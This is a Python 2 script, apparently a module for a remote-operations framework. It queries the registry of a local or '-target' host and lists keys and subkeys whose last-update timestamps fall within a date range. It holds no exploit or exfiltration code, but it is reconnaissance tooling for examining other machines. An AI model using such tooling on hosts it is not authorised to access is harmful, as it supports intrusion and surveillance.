
import dsz, dsz.cmd, dsz.control, dsz.lp
import ops, ops.data
from ops.pprint import pprint
import sys, time, re

def main(ARGS):
    dsz.control.echo.Off()
    (succ, cmdid) = dsz.cmd.RunEx(('registryquery %s' % ARGS), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    object = ops.data.getDszObject(cmdid=cmdid)
    reglist = []
    for key in object.key:
        thisdate = time.strptime(('%s %s' % (key.updatedate, key.updatetime)), '%Y-%m-%d %H:%M:%S')
        if ((thisdate < BEFORE) and (thisdate > AFTER)):
            reglist.append({'name': key.name, 'updatedate': key.updatedate, 'updatetime': key.updatetime})
        for subkey in key.subkey:
            name = ('%s\\%s' % (key.name, subkey.name))
            thisdate = time.strptime(('%s %s' % (subkey.updatedate, subkey.updatetime)), '%Y-%m-%d %H:%M:%S')
            if ((thisdate < BEFORE) and (thisdate > AFTER)):
                reglist.append({'name': name, 'updatedate': subkey.updatedate, 'updatetime': subkey.updatetime})
    reglist.sort(key=(lambda x: x['updatetime']))
    reglist.sort(key=(lambda x: x['updatedate']))
    pprint(reglist, ['key', 'updatedate', 'updatetime'], ['name', 'updatedate', 'updatetime'])
    return True
if (__name__ == '__main__'):
    params = dsz.lp.cmdline.ParseCommandLine(sys.argv, 'regtimes.txt')
    ARGS = ''
    BEFOREDATE = False
    AFTERTIME = False
    AFTERDATE = False
    BEFORETIME = False
    AFTER = ''
    BEFORE = ''
    datere = re.compile('(....)-(..?)-(..?)')
    timere = re.compile('(..?):(..?):(..?)')
    if ((not params.has_key('hive')) or (not (params['hive'][0].lower() in 'ulcgr'))):
        print 'Hive must be one of <C|G|L|R|U>'
        sys.exit(1)
    else:
        ARGS = ('%s -hive %s' % (ARGS, params['hive'][0]))
    if params.has_key('key'):
        ARGS = ('%s -key "%s"' % (ARGS, params['key'][0]))
    if params.has_key('value'):
        ARGS = ('%s -value %s' % (ARGS, params['value'][0]))
    if params.has_key('recursive'):
        ARGS = ('%s -recursive' % ARGS)
    if params.has_key('wow32'):
        ARGS = ('%s -wow32' % ARGS)
    elif params.has_key('wow64'):
        ARGS = ('%s -wow64' % ARGS)
    if params.has_key('target'):
        ARGS = ('%s -target %s' % (ARGS, params['target'][0]))
    if params.has_key('chunksize'):
        ARGS = ('%s -chunksize %s' % (ARGS, params['chunksize'][0]))
    if params.has_key('before'):
        if datere.match(params['before'][0]):
            BEFOREDATE = True
        else:
            print 'The before date is not valid'
            sys.exit(1)
    if params.has_key('after'):
        if datere.match(params['after'][0]):
            AFTERDATE = True
        else:
            print 'The after date is not valid'
            sys.exit(1)
    if params.has_key('beforetime'):
        if (not BEFOREDATE):
            print 'You cannot specify a before time without a before date'
            sys.exit(1)
        elif timere.match(params['beforetime'][0]):
            BEFORETIME = True
        else:
            print 'The before time is not valid'
            sys.exit(1)
    if params.has_key('aftertime'):
        if (not AFTERDATE):
            print 'You cannot specify a after time without a after date'
            sys.exit(1)
        elif timere.match(params['aftertime'][0]):
            AFTERTIME = True
        else:
            print 'The after time is not valid'
            sys.exit(1)
    if (AFTERDATE and AFTERTIME):
        AFTER = time.strptime(('%s %s' % (params['after'][0], params['aftertime'][0])), '%Y-%m-%d %H:%M:%S')
    elif AFTERDATE:
        AFTER = time.strptime(params['after'][0], '%Y-%m-%d')
    else:
        AFTER = time.strptime('0001-01-01', '%Y-%m-%d')
    if (BEFOREDATE and BEFORETIME):
        BEFORE = time.strptime(('%s %s' % (params['before'][0], params['beforetime'][0])), '%Y-%m-%d %H:%M:%S')
    elif BEFOREDATE:
        BEFORE = time.strptime(('%s' % params['before'][0]), '%Y-%m-%d')
    else:
        BEFORE = time.strptime('9999-12-31', '%Y-%m-%d')
    main(ARGS)